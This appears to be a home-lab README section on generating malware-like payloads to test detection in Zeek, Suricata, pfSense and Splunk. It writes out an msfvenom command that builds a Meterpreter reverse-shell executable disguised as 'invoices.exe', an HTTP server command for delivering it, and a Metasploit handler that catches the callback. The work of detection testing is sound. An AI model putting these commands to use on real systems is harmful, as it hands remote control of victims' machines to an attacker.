# Payload Generation
This section documents how I created controlled malware-like payloads to generate real attacker telemetry inside the lab environment. The goal was to simulate adversary behavior safely, observe how different systems respond, and verify that Zeek, Suricata, pfSense, and Splunk correctly detect and correlate these activities.
#

## Objective
### To create actionable telemetry, I generated:
- MSFvenom reverse shell payloads
- Test binaries for exploitation scenarios
- HTTP-hosted payload delivery
- Callback behavior for detection across multiple layers
### These payloads helped produce data across:
- Sysmon
- Windows Event Logs
- Suricata (EVE JSON)
- Zeek (conn, http, ssl logs)
- pfSense firewall logs
- Splunk correlation searches
### MSFvenom Reverse Shell Payload
My main payload was a Windows Meterpreter executable created with MSFvenom:

``msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.250 \
LPORT=4444 \
-f exe -o invoices.exe``

### Why this matters
✔ Behaves like a real-world malicious artifact

✔ Triggers antivirus-like behavior

✔ Generates Sysmon logs (process creation, network connections)

✔ Creates Zeek + Suricata telemetry from the callback

✔ Helps test Splunk detections (ATT&CK T1059, T1105, etc.)

### The generated payload is stored under:
``payloads/invoices.exe``
#

## Hosting the Payload Over HTTP
### To deliver the payload to the Windows machine, I used a simple Python HTTP server:
``python3 -m http.server 9999
``

This simulates a common attacker delivery technique.

It also generates:

- Zeek HTTP logs
- Suricata HTTP alerts
- pfSense firewall flows

The hosting scripts are located in:

``scripts/start_http_server.sh``

## Metasploit Listener Setup

I configured Metasploit to listen for the callback using a resource file:

``use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.250
set LPORT 4444
run
``

Stored in the repo as:

``scripts/msf_handler.rc``

Start it with:

``msfconsole -r scripts/msf_handler.rc``

Purpose of This Section

This entire section is designed to:

✔ Produce meaningful telemetry

✔ Test EDR + NSM visibility

✔ Train SOC investigation skills

✔ Validate IDS signatures

✔ Validate detection rules

✔ Show attack behavior in Splunk

Payloads are only used for research and learning inside a safe, isolated lab.

